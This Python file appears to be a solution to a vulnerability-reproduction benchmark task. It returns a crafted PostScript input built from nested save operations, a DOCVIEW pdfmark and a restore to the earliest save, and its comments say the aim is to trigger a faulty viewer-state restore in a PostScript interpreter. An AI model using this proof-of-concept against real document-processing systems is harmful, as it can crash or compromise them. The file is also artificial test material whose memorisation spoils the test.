import os
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        # PostScript crafted to:
        # 1) perform several save operations before any viewer state exists/gets initialized
        # 2) initialize viewer state via a DOCVIEW pdfmark
        # 3) restore back to the earliest save, triggering viewer state restore when depth can be 0
        ps = (
            b"%!PS-Adobe-3.0\n"
            b"/s1 save def\n"
            b"/s2 save def\n"
            b"/s3 save def\n"
            b"[ /PageMode /UseOutlines /PageLayout /OneColumn /DOCVIEW pdfmark\n"
            b"s1 restore\n"
            b"quit\n"
        )
        return ps